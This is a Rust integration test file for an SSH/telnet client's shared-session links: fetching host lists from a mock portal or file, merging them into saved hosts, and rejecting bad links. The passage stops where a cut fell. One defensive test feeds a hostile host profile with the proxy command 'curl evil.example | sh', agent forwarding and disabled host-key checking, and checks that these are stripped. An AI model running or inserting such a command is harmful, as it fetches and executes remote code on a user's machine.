//! Port of tests/unit/server/shared-session-routes.test.ts: the routes as `Backend`
//! methods, against a web server on this machine that stands in for a lab portal. The
//! checks of when a link is due are in the store's tests.

mod support;

use std::sync::{Arc, Mutex};

use muxus_core::api::{SavedHostProfile, SharedSessionFetchResponse, SharedSessionSource};
use muxus_session::{ApiError, Backend};
use serde_json::{Value, json};
use support::{Sandbox, body, start};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

type Answer = Arc<dyn Fn(&str) -> Vec<u8> + Send + Sync>;

/// A web server that answers every request with what the test set last.
struct Portal {
    url: String,
    host: String,
    answer: Arc<Mutex<Answer>>,
    task: tokio::task::JoinHandle<()>,
}

impl Portal {
    async fn start() -> Self {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let host = listener.local_addr().unwrap().to_string();
        let first: Answer = Arc::new(|_| ok(b"[Bookmarks]\n"));
        let answer = Arc::new(Mutex::new(first));
        let answers = answer.clone();
        let task = tokio::spawn(async move {
            while let Ok((mut stream, _)) = listener.accept().await {
                let answers = answers.clone();
                tokio::spawn(async move {
                    let mut request = Vec::new();
                    let mut chunk = [0u8; 1024];
                    while !request.windows(4).any(|window| window == b"\r\n\r\n") {
                        match stream.read(&mut chunk).await {
                            Ok(0) | Err(_) => return,
                            Ok(read) => request.extend_from_slice(&chunk[..read]),
                        }
                    }
                    let text = String::from_utf8_lossy(&request).into_owned();
                    let path = text.split(' ').nth(1).unwrap_or("/").to_owned();
                    let answer = answers.lock().unwrap().clone();
                    let _ = stream.write_all(&answer(&path)).await;
                    let _ = stream.shutdown().await;
                });
            }
        });
        Self {
            url: format!("http://{host}"),
            host,
            answer,
            task,
        }
    }

    /// What the portal answers from now on, by the path asked for.
    fn answers(&self, answer: impl Fn(&str) -> Vec<u8> + Send + Sync + 'static) {
        *self.answer.lock().unwrap() = Arc::new(answer);
    }
}

impl Drop for Portal {
    fn drop(&mut self) {
        self.task.abort();
    }
}

fn response(status: &str, headers: &[(&str, &str)], content: &[u8]) -> Vec<u8> {
    let mut out = format!(
        "HTTP/1.1 {status}\r\ncontent-length: {}\r\nconnection: close\r\n",
        content.len()
    );
    for (name, value) in headers {
        out.push_str(&format!("{name}: {value}\r\n"));
    }
    out.push_str("\r\n");
    let mut out = out.into_bytes();
    out.extend_from_slice(content);
    out
}

fn ok(content: &[u8]) -> Vec<u8> {
    response("200 OK", &[], content)
}

fn redirect(location: &str) -> Vec<u8> {
    response("302 Found", &[("location", location)], b"")
}

struct Lab {
    sandbox: Sandbox,
    portal: Portal,
}

impl Lab {
    async fn start() -> Self {
        Self {
            sandbox: start().await,
            portal: Portal::start().await,
        }
    }

    fn backend(&self) -> &Backend {
        &self.sandbox.backend
    }

    async fn put(&self, overrides: Value) -> Result<SharedSessionSource, ApiError> {
        let mut input = json!({
            "name": "Lab hosts",
            "url": format!("{}/me.mxtsessions", self.portal.url),
            "folder": "Lab",
            "refreshMinutes": 60,
        });
        input
            .as_object_mut()
            .unwrap()
            .extend(overrides.as_object().unwrap().clone());
        self.backend().save_shared_session_source(body(input)).await
    }

    async fn add_source(&self, overrides: Value) -> SharedSessionSource {
        self.put(overrides).await.expect("the link is stored")
    }

    async fn apply(&self, id: &str, payload: Value) -> Result<Value, ApiError> {
        let result = self
            .backend()
            .apply_shared_sessions(id, body(payload))
            .await?;
        Ok(serde_json::to_value(result).unwrap())
    }

    async fn applied(&self, id: &str, payload: Value) -> Value {
        self.apply(id, payload).await.expect("the list is applied")
    }

    async fn fetch(&self, id: &str, force: bool) -> Result<SharedSessionFetchResponse, ApiError> {
        self.backend().fetch_shared_sessions(id, force).await
    }

    async fn profiles(&self) -> Vec<SavedHostProfile> {
        self.backend().saved_hosts().await.unwrap().profiles
    }

    async fn profile_ids(&self) -> Vec<String> {
        self.profiles()
            .await
            .into_iter()
            .map(|profile| profile.id)
            .collect()
    }

    /// The connection settings of the first host, as JSON.
    async fn first_profile(&self) -> Value {
        serde_json::to_value(&self.profiles().await[0].profile).unwrap()
    }

    async fn sources(&self) -> Vec<SharedSessionSource> {
        self.backend()
            .shared_session_sources()
            .await
            .unwrap()
            .sources
    }

    async fn save_host(&self, input: Value) {
        self.backend().save_saved_host(body(input)).await.unwrap();
    }

    async fn patch_host(&self, id: &str, patch: Value) {
        self.backend()
            .patch_saved_host_metadata(id, body(patch))
            .await
            .unwrap();
    }
}

fn fetched(content: &str) -> SharedSessionFetchResponse {
    SharedSessionFetchResponse::Fetched {
        content: content.to_owned(),
    }
}

fn node(id: &str, overrides: Value) -> Value {
    let mut host = json!({
        "id": id,
        "name": id,
        "group": "Lab/clab",
        "profile": {
            "kind": "ssh", "target": format!("{id}.lab.example.net"),
            "useConfig": false, "user": "alice",
        },
    });
    host.as_object_mut()
        .unwrap()
        .extend(overrides.as_object().unwrap().clone());
    host
}

fn plain(id: &str) -> Value {
    node(id, json!({}))
}

mod shared_session_links {
    use super::*;

    #[tokio::test]
    async fn stores_a_link_with_its_folder_and_interval() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({ "folder": " Lab / Nodes " })).await;

        assert_eq!(source.name, "Lab hosts");
        assert_eq!(source.url, format!("{}/me.mxtsessions", lab.portal.url));
        assert_eq!(source.folder, "Lab/Nodes");
        assert_eq!(source.refresh_minutes, 60);
        assert_eq!(source.host_count, 0);
        assert_eq!(lab.sources().await, [source]);
    }

    #[tokio::test]
    async fn refuses_links_that_cannot_be_followed() {
        let lab = Lab::start().await;
        let cases = [
            (
                "ftp://portal.example.net/list",
                "Shared sessions are read from https:// or http:// links, or from a file.",
            ),
            (
                "portal.example.net/list",
                "Enter the full link, starting with https://, or the full path of the file.",
            ),
            (
                "lists/lab.json",
                "Enter the full link, starting with https://, or the full path of the file.",
            ),
            (
                "https://me:secret@portal.example.net/list",
                "A link with a user name or password in it is not supported.",
            ),
        ];
        for (url, message) in cases {
            let error = lab
                .put(json!({ "name": "Lab", "url": url }))
                .await
                .unwrap_err();
            assert_eq!((error.status, error.message.as_str()), (400, message));
        }
        assert!(lab.sources().await.is_empty());
    }

    #[tokio::test]
    async fn wants_a_folder_so_a_list_cannot_spread_over_the_whole_sidebar() {
        let lab = Lab::start().await;
        let error = lab
            .put(json!({ "name": "Lab", "folder": " / " }))
            .await
            .unwrap_err();
        assert_eq!(error.status, 400);
        assert_eq!(error.message, "Choose a folder for the shared sessions.");
    }

    #[tokio::test]
    async fn checks_the_limits_of_a_link() {
        let lab = Lab::start().await;
        for input in [
            json!({ "name": "  " }),
            json!({ "name": "x".repeat(201) }),
            json!({ "url": " " }),
            json!({ "refreshMinutes": 7 * 24 * 60 + 1 }),
            json!({ "id": "" }),
        ] {
            let error = lab.put(input.clone()).await.unwrap_err();
            assert_eq!(error.status, 400, "for {input}");
        }
        // A setting the route does not know is a mistake, not something to drop silently.
        let unknown: Result<muxus_core::api::SharedSessionSourceInput, _> =
            serde_json::from_value(json!({
                "name": "Lab", "url": "https://portal.example.net", "folder": "Lab",
                "refreshMinutes": 60, "lastError": "",
            }));
        assert!(unknown.is_err());
    }
}

mod reading_a_shared_sessions_link {
    use super::*;

    #[tokio::test]
    async fn returns_the_text_behind_the_link_following_redirects() {
        let lab = Lab::start().await;
        lab.portal.answers(|path| {
            if path == "/me.mxtsessions" {
                redirect("/files/list")
            } else {
                ok(b"[Bookmarks]\nSubRep=clab\n")
            }
        });
        let source = lab.add_source(json!({})).await;

        assert_eq!(
            lab.fetch(&source.id, true).await.unwrap(),
            fetched("[Bookmarks]\nSubRep=clab\n")
        );
    }

    #[tokio::test]
    async fn reads_a_file_saved_in_the_windows_code_page() {
        let lab = Lab::start().await;
        lab.portal
            .answers(|_| ok(&[0x53, 0x75, 0x62, 0x52, 0x65, 0x70, 0x3d, 0xbb]));
        let source = lab.add_source(json!({})).await;

        assert_eq!(
            lab.fetch(&source.id, true).await.unwrap(),
            fetched("SubRep=»")
        );
    }

    #[tokio::test]
    async fn leaves_a_link_just_added_to_whoever_added_it_and_reads_a_restored_one_when_due() {
        let lab = Lab::start().await;
        let added = lab.add_source(json!({})).await;
        let restored = lab
            .add_source(json!({ "id": "from-backup", "name": "Restored", "folder": "Restored" }))
            .await;

        // The dialog that added the link reads it at once; no other window should.
        assert_eq!(
            lab.fetch(&added.id, false).await.unwrap(),
            SharedSessionFetchResponse::NotDue
        );
        assert!(matches!(
            lab.fetch(&added.id, true).await.unwrap(),
            SharedSessionFetchResponse::Fetched { .. }
        ));

        assert!(matches!(
            lab.fetch(&restored.id, false).await.unwrap(),
            SharedSessionFetchResponse::Fetched { .. }
        ));
        assert_eq!(
            lab.fetch(&restored.id, false).await.unwrap(),
            SharedSessionFetchResponse::NotDue
        );
    }

    #[tokio::test]
    async fn leaves_a_link_that_is_only_read_on_request_alone() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({ "refreshMinutes": 0 })).await;

        assert_eq!(
            lab.fetch(&source.id, false).await.unwrap(),
            SharedSessionFetchResponse::NotDue
        );
        assert!(matches!(
            lab.fetch(&source.id, true).await.unwrap(),
            SharedSessionFetchResponse::Fetched { .. }
        ));
    }

    #[tokio::test]
    async fn keeps_why_a_link_could_not_be_read_without_the_link_itself() {
        let lab = Lab::start().await;
        lab.portal
            .answers(|_| response("403 Forbidden", &[], b"no"));
        let source = lab
            .add_source(json!({ "url": format!("{}/personal-token/list", lab.portal.url) }))
            .await;

        let error = lab.fetch(&source.id, true).await.unwrap_err();

        assert_eq!(error.status, 502);
        assert_eq!(
            error.message,
            format!("{} answered 403 Forbidden.", lab.portal.host)
        );
        let stored = &lab.sources().await[0];
        assert_eq!(stored.last_error.as_deref(), Some(error.message.as_str()));
        assert!(stored.last_checked_at.is_some());
    }

    #[tokio::test]
    async fn words_a_refusal_the_way_the_server_did() {
        let lab = Lab::start().await;
        lab.portal
            .answers(|_| response("503 Portal is being updated", &[], b""));
        let source = lab.add_source(json!({})).await;

        let error = lab.fetch(&source.id, true).await.unwrap_err();
        assert_eq!(
            error.message,
            format!("{} answered 503 Portal is being updated.", lab.portal.host)
        );
    }

    #[tokio::test]
    async fn answers_404_for_a_link_that_does_not_exist() {
        let lab = Lab::start().await;
        let error = lab.fetch("missing", false).await.unwrap_err();
        assert_eq!(error.status, 404);
    }

    #[tokio::test]
    async fn gives_up_on_a_link_that_redirects_in_circles_or_is_too_large() {
        let lab = Lab::start().await;
        lab.portal.answers(|_| redirect("/again"));
        let source = lab.add_source(json!({})).await;
        let error = lab.fetch(&source.id, true).await.unwrap_err();
        assert_eq!(
            (error.status, error.message.as_str()),
            (502, "The link redirects too many times.")
        );

        lab.portal
            .answers(|_| ok(&vec![b'x'; 10 * 1024 * 1024 + 1]));
        let error = lab.fetch(&source.id, true).await.unwrap_err();
        assert_eq!(
            (error.status, error.message.as_str()),
            (502, "The shared sessions file is larger than 10 MB.")
        );

        // A redirect may lead to another web address only.
        lab.portal
            .answers(|_| redirect("ftp://portal.example.net/list"));
        let error = lab.fetch(&source.id, true).await.unwrap_err();
        assert_eq!(
            error.message,
            "Shared sessions are read from https:// or http:// links, or from a file."
        );
    }

    #[tokio::test]
    async fn says_when_nothing_listens_at_the_address() {
        let lab = Lab::start().await;
        let closed = {
            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
            listener.local_addr().unwrap().to_string()
        };
        let source = lab
            .add_source(json!({ "url": format!("http://{closed}/secret-token/list") }))
            .await;

        let error = lab.fetch(&source.id, true).await.unwrap_err();
        assert_eq!(error.status, 502);
        assert_eq!(
            error.message,
            format!("{closed} could not be reached (ECONNREFUSED).")
        );
        assert!(!error.message.contains("secret-token"));
    }
}

mod reading_a_shared_sessions_file {
    use super::*;

    #[tokio::test]
    async fn follows_a_file_on_this_computer_or_a_shared_drive_by_its_path() {
        let lab = Lab::start().await;
        let directory = tempfile::tempdir().unwrap();
        let file = directory.path().join("lab.muxus-sessions.json");
        std::fs::write(&file, r#"{"format":"muxus-shared-sessions","hosts":[]}"#).unwrap();
        let source = lab
            .add_source(json!({ "url": format!("  {}  ", file.display()) }))
            .await;

        assert_eq!(source.url, file.to_string_lossy());
        assert_eq!(
            lab.fetch(&source.id, true).await.unwrap(),
            fetched(r#"{"format":"muxus-shared-sessions","hosts":[]}"#)
        );
    }

    #[tokio::test]
    async fn takes_a_file_address_and_a_path_under_the_home_folder() {
        let lab = Lab::start().await;
        let directory = tempfile::tempdir().unwrap();
        let file = directory.path().join("lab.mxtsessions");
        let address = url::Url::from_file_path(&file).unwrap();

        let by_address = lab.add_source(json!({ "url": address.as_str() })).await;
        assert_eq!(by_address.url, file.to_string_lossy());
        let under_home = lab
            .add_source(json!({ "url": "~/lists/lab.json", "folder": "Home" }))
            .await;
        assert_eq!(
            under_home.url,
            lab.sandbox
                .home()
                .join("lists")
                .join("lab.json")
                .to_string_lossy()
        );
    }

    #[tokio::test]
    async fn says_what_is_wrong_with_a_file_that_cannot_be_read_naming_only_the_file() {
        let lab = Lab::start().await;
        let directory = tempfile::tempdir().unwrap();
        let missing = lab
            .add_source(json!({ "url": directory.path().join("gone.json").to_string_lossy() }))
            .await;
        let folder = lab
            .add_source(json!({ "url": directory.path().to_string_lossy(), "folder": "Folder" }))
            .await;

        let first = lab.fetch(&missing.id, true).await.unwrap_err();
        assert_eq!(first.status, 502);
        assert_eq!(
            first.message,
            "gone.json was not found. Check the path, and that the drive or share is connected."
        );
        let second = lab.fetch(&folder.id, true).await.unwrap_err();
        assert_eq!(
            second.message,
            format!(
                "{} is a folder. Enter the path of the session list in it.",
                directory.path().file_name().unwrap().to_string_lossy()
            )
        );
        let stored = lab
            .sources()
            .await
            .into_iter()
            .find(|source| source.id == missing.id)
            .unwrap();
        assert!(
            stored
                .last_error
                .unwrap()
                .contains("gone.json was not found")
        );
    }

    #[tokio::test]
    async fn never_follows_a_web_address_into_a_file() {
        let lab = Lab::start().await;
        let directory = tempfile::tempdir().unwrap();
        let file = directory.path().join("secret.txt");
        std::fs::write(&file, "private").unwrap();
        let address = url::Url::from_file_path(&file).unwrap().to_string();
        lab.portal.answers(move |_| redirect(&address));
        let source = lab.add_source(json!({})).await;

        let error = lab.fetch(&source.id, true).await.unwrap_err();

        assert_eq!(error.status, 502);
        assert!(error.message.contains("redirects to a file"));
    }
}

mod applying_a_shared_sessions_list {
    use super::*;

    #[tokio::test]
    async fn adds_the_hosts_to_their_folders_and_marks_them_as_the_links() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;

        let result = lab
            .applied(
                &source.id,
                json!({ "hosts": [plain("node0"), node("node1", json!({ "color": "#3366ff" }))] }),
            )
            .await;

        assert_eq!(
            (
                &result["added"],
                &result["updated"],
                &result["removed"],
                &result["unchanged"]
            ),
            (&json!(2), &json!(0), &json!(0), &json!(0))
        );
        assert_eq!(result["source"]["hostCount"], 2);
        assert!(result["source"]["lastSyncedAt"].is_string());
        let profiles = lab.profiles().await;
        assert_eq!(profiles.len(), 2);
        let first = serde_json::to_value(&profiles[0]).unwrap();
        assert_eq!(first["id"], "node0");
        assert_eq!(first["name"], "node0");
        assert_eq!(first["profile"]["target"], "node0.lab.example.net");
        assert_eq!(first["profile"]["user"], "alice");
        assert_eq!(first["metadata"]["group"], "Lab/clab");
        assert_eq!(first["metadata"]["sharedSourceId"], source.id);
        let second = serde_json::to_value(&profiles[1]).unwrap();
        assert_eq!(second["id"], "node1");
        assert_eq!(second["metadata"]["color"], "#3366ff");
        assert_eq!(second["metadata"]["sharedSourceId"], source.id);
    }

    #[tokio::test]
    async fn follows_the_list_changed_entries_are_rewritten_and_missing_ones_deleted() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(
            &source.id,
            json!({ "hosts": [plain("node0"), plain("node1"), plain("node2")] }),
        )
        .await;

        let result = lab
            .applied(
                &source.id,
                json!({ "hosts": [
                    plain("node0"),
                    node("node1", json!({ "profile": {
                        "kind": "ssh", "target": "node1.lab.example.net",
                        "useConfig": false, "user": "bob",
                    } })),
                    plain("node3"),
                ] }),
            )
            .await;

        assert_eq!(
            (
                &result["added"],
                &result["updated"],
                &result["removed"],
                &result["unchanged"]
            ),
            (&json!(1), &json!(1), &json!(1), &json!(1))
        );
        assert_eq!(lab.profile_ids().await, ["node0", "node1", "node3"]);
        let stored = lab.profiles().await;
        assert_eq!(
            serde_json::to_value(&stored[1].profile).unwrap()["user"],
            "bob"
        );
    }

    #[tokio::test]
    async fn brings_over_only_the_settings_the_list_changed_and_keeps_the_users_own() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        let listed = |profile: Value| {
            let mut settings = json!({
                "kind": "ssh", "target": "node0.lab.example.net", "useConfig": false,
            });
            settings
                .as_object_mut()
                .unwrap()
                .extend(profile.as_object().unwrap().clone());
            node("node0", json!({ "profile": settings }))
        };
        // The list has no user: everyone logs in as themselves.
        lab.applied(
            &source.id,
            json!({ "hosts": [listed(json!({ "port": 22 }))] }),
        )
        .await;
        // The user fills in their own name and key, renames the host and moves it.
        lab.save_host(json!({
            "id": "node0",
            "name": "my node",
            "profile": {
                "kind": "ssh", "target": "node0.lab.example.net", "useConfig": false,
                "port": 22, "user": "me", "identityFiles": ["~/.ssh/mine"],
            },
        }))
        .await;
        lab.patch_host(
            "node0",
            json!({ "group": "Favourites", "color": "#aa0000" }),
        )
        .await;

        // The publisher changes the port and adds a startup command.
        let result = lab
            .applied(
                &source.id,
                json!({ "hosts": [listed(json!({ "port": 2222, "remoteCommand": "sudo -i" }))] }),
            )
            .await;

        assert_eq!(
            (&result["updated"], &result["unchanged"]),
            (&json!(1), &json!(0))
        );
        let host = &lab.profiles().await[0];
        assert_eq!(host.name, "my node");
        assert_eq!(host.metadata.group.as_deref(), Some("Favourites"));
        assert_eq!(host.metadata.color.as_deref(), Some("#aa0000"));
        assert_eq!(
            lab.first_profile().await,
            json!({
                "kind": "ssh",
                "profileId": "node0",
                "target": "node0.lab.example.net",
                "useConfig": false,
                "port": 2222,
                "remoteCommand": "sudo -i",
                "user": "me",
                "identityFiles": ["~/.ssh/mine"],
            })
        );
    }

    #[tokio::test]
    async fn lets_the_list_win_where_it_changes_the_very_setting_the_user_changed() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;
        lab.save_host(json!({
            "id": "node0",
            "name": "node0",
            "profile": {
                "kind": "ssh", "target": "node0.lab.example.net", "useConfig": false,
                "user": "me", "port": 2200,
            },
        }))
        .await;

        // The list changes the user and the name, moves the host, and gives it a colour.
        lab.applied(
            &source.id,
            json!({ "hosts": [node("node0", json!({
                "name": "node zero",
                "group": "Lab/moved",
                "color": "#00aa00",
                "profile": {
                    "kind": "ssh", "target": "node0.lab.example.net",
                    "useConfig": false, "user": "root",
                },
            }))] }),
        )
        .await;

        let host = &lab.profiles().await[0];
        assert_eq!(host.name, "node zero");
        assert_eq!(host.metadata.group.as_deref(), Some("Lab/moved"));
        assert_eq!(host.metadata.color.as_deref(), Some("#00aa00"));
        let profile = lab.first_profile().await;
        assert_eq!(
            (&profile["user"], &profile["port"]),
            (&json!("root"), &json!(2200))
        );
    }

    #[tokio::test]
    async fn drops_a_setting_the_list_takes_away_and_replaces_everything_when_the_kind_changes() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(
            &source.id,
            json!({ "hosts": [node("node0", json!({ "profile": {
                "kind": "ssh", "target": "node0.lab.example.net", "useConfig": false,
                "user": "alice", "remoteCommand": "sudo -i",
            } }))] }),
        )
        .await;

        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;
        assert_eq!(
            lab.first_profile().await,
            json!({
                "kind": "ssh",
                "profileId": "node0",
                "target": "node0.lab.example.net",
                "useConfig": false,
                "user": "alice",
            })
        );

        lab.applied(
            &source.id,
            json!({ "hosts": [node("node0", json!({ "profile": {
                "kind": "telnet", "host": "node0.lab.example.net", "port": 23,
            } }))] }),
        )
        .await;
        assert_eq!(
            lab.first_profile().await,
            json!({
                "kind": "telnet",
                "profileId": "node0",
                "host": "node0.lab.example.net",
                "port": 23,
            })
        );
    }

    #[tokio::test]
    async fn keeps_what_the_user_set_on_a_host_while_its_entry_stays_the_same() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;
        lab.patch_host(
            "node0",
            json!({ "color": "#aa0000", "group": "Favourites" }),
        )
        .await;

        // The same entry, with its fields in another order.
        let result = lab
            .applied(
                &source.id,
                json!({ "hosts": [{
                    "profile": {
                        "user": "alice", "useConfig": false,
                        "target": "node0.lab.example.net", "kind": "ssh",
                    },
                    "group": "Lab/clab", "name": "node0", "id": "node0",
                }] }),
            )
            .await;
        assert_eq!(result["unchanged"], 1);
        let metadata = &lab.profiles().await[0].metadata;
        assert_eq!(metadata.color.as_deref(), Some("#aa0000"));
        assert_eq!(metadata.group.as_deref(), Some("Favourites"));

        // Once the list changes the entry, the list decides again.
        lab.applied(
            &source.id,
            json!({ "hosts": [node("node0", json!({ "group": "Lab/moved" }))] }),
        )
        .await;
        let metadata = &lab.profiles().await[0].metadata;
        assert_eq!(metadata.color.as_deref(), Some("#aa0000"));
        assert_eq!(metadata.group.as_deref(), Some("Lab/moved"));
    }

    #[tokio::test]
    async fn never_lets_a_list_set_what_runs_here_or_weakens_a_check() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;

        lab.applied(
            &source.id,
            json!({ "hosts": [node("node0", json!({ "profile": {
                "kind": "ssh",
                "target": "node0.lab.example.net",
                "useConfig": true,
                "proxyCommand": "curl evil.example | sh",
                "forwardAgent": true,
                "strictHostKeyChecking": "no",
                "forwards": [
                    { "type": "remote", "bindPort": 9000, "targetHost": "localhost", "targetPort": 22 },
                    { "type": "local", "bindPort": 8443, "targetHost": "ui.lab.example.net", "targetPort": 443 },
                ],
                "remoteCommand": "sudo -i",
                "requestTty": "yes",
            } }))] }),
        )
        .await;

        assert_eq!(
            lab.first_profile().await,
            json!({
                "kind": "ssh",
                "profileId": "node0",
                "target": "node0.lab.example.net",
                "useConfig": false,
                "forwards": [
                    { "type": "local", "bindPort": 8443, "targetHost": "ui.lab.example.net", "targetPort": 443 },
                ],
                "remoteCommand": "sudo -i",
                "requestTty": "yes",
            })
        );
    }

    #[tokio::test]
    async fn refuses_a_list_with_an_invalid_host_and_keeps_the_hosts_it_had() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;

        let error = lab
            .apply(
                &source.id,
                json!({ "hosts": [
                    plain("node1"),
                    node("broken", json!({ "profile": { "kind": "telnet", "host": "", "port": 23 } })),
                ] }),
            )
            .await
            .unwrap_err();

        assert_eq!(error.status, 400);
        assert!(
            error.message.contains("“broken” is not a valid host"),
            "{}",
            error.message
        );
        assert_eq!(lab.profile_ids().await, ["node0"]);
        let stored = &lab.sources().await[0];
        assert_eq!(stored.host_count, 1);
        assert!(stored.last_error.as_deref().unwrap().contains("“broken”"));

        // An entry without a name is named by its place in the list.
        let nameless = lab
            .apply(
                &source.id,
                json!({ "hosts": [plain("node0"), { "id": "x" }] }),
            )
            .await
            .unwrap_err();
        assert!(
            nameless
                .message
                .starts_with("entry 2 is not a valid host: "),
            "{}",
            nameless.message
        );
    }

    #[tokio::test]
    async fn refuses_an_empty_list_instead_of_deleting_every_host() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;

        let error = lab
            .apply(&source.id, json!({ "hosts": [] }))
            .await
            .unwrap_err();

        assert_eq!(error.status, 400);
        assert_eq!(error.message, "The shared sessions list has no hosts.");
        assert_eq!(lab.profiles().await.len(), 1);
    }

    #[tokio::test]
    async fn refuses_an_entry_listed_twice() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;

        let error = lab
            .apply(
                &source.id,
                json!({ "hosts": [plain("node0"), plain("node0")] }),
            )
            .await
            .unwrap_err();

        assert_eq!(error.status, 400);
        assert_eq!(error.message, "The shared sessions list “node0” twice.");
        assert!(lab.profiles().await.is_empty());
        assert_eq!(
            lab.sources().await[0].last_error.as_deref(),
            Some("The shared sessions list “node0” twice.")
        );
    }

    #[tokio::test]
    async fn records_a_list_that_could_not_be_read_and_clears_it_on_the_next_good_one() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;

        let failed = lab
            .applied(
                &source.id,
                json!({ "error": "The link returned a web page instead of a session list." }),
            )
            .await;
        assert_eq!(failed["unchanged"], 1);
        assert_eq!(
            failed["source"]["lastError"],
            "The link returned a web page instead of a session list."
        );
        assert_eq!(lab.profiles().await.len(), 1);

        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;
        assert_eq!(lab.sources().await[0].last_error, None);

        let missing = lab
            .apply("missing", json!({ "error": "The link returned nothing." }))
            .await
            .unwrap_err();
        assert_eq!(missing.status, 404);
        let missing = lab
            .apply("missing", json!({ "hosts": [plain("node0")] }))
            .await
            .unwrap_err();
        assert_eq!(missing.status, 404);
    }

    #[tokio::test]
    async fn takes_over_a_host_restored_from_a_backup_and_never_one_of_another_link() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        let other = lab
            .add_source(json!({ "name": "Other", "folder": "Other" }))
            .await;
        lab.save_host(json!({
            "id": "node0", "name": "node0",
            "profile": { "kind": "ssh", "target": "old.example.net", "useConfig": false },
        }))
        .await;

        let result = lab
            .applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;
        assert_eq!(
            (&result["added"], &result["updated"]),
            (&json!(0), &json!(1))
        );
        assert_eq!(
            lab.profiles().await[0].metadata.shared_source_id.as_deref(),
            Some(source.id.as_str())
        );

        let clash = lab
            .apply(&other.id, json!({ "hosts": [plain("node0")] }))
            .await
            .unwrap_err();
        assert_eq!(clash.status, 400);
        assert_eq!(
            clash.message,
            "“node0” already belongs to another shared sessions link."
        );
        assert_eq!(
            lab.profiles().await[0].metadata.shared_source_id.as_deref(),
            Some(source.id.as_str())
        );
    }
}

mod moving_the_folder_of_a_shared_sessions_link {
    use super::*;

    async fn groups(lab: &Lab) -> Vec<Option<String>> {
        lab.profiles()
            .await
            .into_iter()
            .map(|profile| profile.metadata.group)
            .collect()
    }

    #[tokio::test]
    async fn takes_the_hosts_along_when_the_link_gets_another_folder_except_those_moved_out() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(
            &source.id,
            json!({ "hosts": [
                plain("node0"), node("node1", json!({ "group": "Lab" })), plain("node2"),
            ] }),
        )
        .await;
        lab.patch_host("node2", json!({ "group": "Favourites" }))
            .await;

        lab.add_source(json!({
            "id": source.id, "name": source.name, "url": source.url,
            "folder": "Teams/Lab", "refreshMinutes": 60,
        }))
        .await;

        let expected = [
            Some("Teams/Lab/clab".to_owned()),
            Some("Teams/Lab".to_owned()),
            Some("Favourites".to_owned()),
        ];
        assert_eq!(groups(&lab).await, expected);
        // The list now places its entries in the new folder, and none of them counts as
        // changed.
        let result = lab
            .applied(
                &source.id,
                json!({ "hosts": [
                    node("node0", json!({ "group": "Teams/Lab/clab" })),
                    node("node1", json!({ "group": "Teams/Lab" })),
                    node("node2", json!({ "group": "Teams/Lab/clab" })),
                ] }),
            )
            .await;
        assert_eq!(
            (
                &result["added"],
                &result["updated"],
                &result["removed"],
                &result["unchanged"]
            ),
            (&json!(0), &json!(0), &json!(0), &json!(3))
        );
        assert_eq!(groups(&lab).await, expected);
    }

    #[tokio::test]
    async fn follows_a_folder_renamed_in_the_sidebar() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({ "folder": "Work/Lab" })).await;
        lab.applied(
            &source.id,
            json!({ "hosts": [node("node0", json!({ "group": "Work/Lab/clab" }))] }),
        )
        .await;

        // The sidebar moves the hosts itself and reports the rename.
        lab.patch_host("node0", json!({ "group": "Office/Lab/clab" }))
            .await;
        lab.backend()
            .move_folder_settings("Work", "Office")
            .await
            .unwrap();

        assert_eq!(lab.sources().await[0].folder, "Office/Lab");
        let result = lab
            .applied(
                &source.id,
                json!({ "hosts": [node("node0", json!({ "group": "Office/Lab/clab" }))] }),
            )
            .await;
        assert_eq!(
            (&result["unchanged"], &result["updated"]),
            (&json!(1), &json!(0))
        );
    }
}

mod removing_a_shared_sessions_link {
    use super::*;

    #[tokio::test]
    async fn deletes_its_hosts_and_leaves_the_others() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(
            &source.id,
            json!({ "hosts": [plain("node0"), plain("node1")] }),
        )
        .await;
        lab.save_host(json!({
            "id": "mine", "name": "Mine",
            "profile": { "kind": "telnet", "host": "mine.example.net", "port": 23 },
        }))
        .await;

        let deleted = lab
            .backend()
            .delete_shared_session_source(&source.id, false)
            .await
            .unwrap();

        assert!(deleted);
        assert_eq!(lab.profile_ids().await, ["mine"]);
        assert!(lab.sources().await.is_empty());
        assert!(
            !lab.backend()
                .delete_shared_session_source(&source.id, false)
                .await
                .unwrap()
        );
    }

    #[tokio::test]
    async fn can_keep_the_hosts_as_hosts_of_the_users_own() {
        let lab = Lab::start().await;
        let source = lab.add_source(json!({})).await;
        lab.applied(&source.id, json!({ "hosts": [plain("node0")] }))
            .await;

        lab.backend()
            .delete_shared_session_source(&source.id, true)
            .await
            .unwrap();

        let kept = &lab.profiles().await[0];
        assert_eq!(kept.id, "node0");
        assert_eq!(kept.metadata.shared_source_id, None);
        assert!(
            serde_json::to_value(&kept.metadata)
                .unwrap()
                .get("sharedSourceId")
                .is_none()
        );
    }
}

mod one_check_of_a_link {
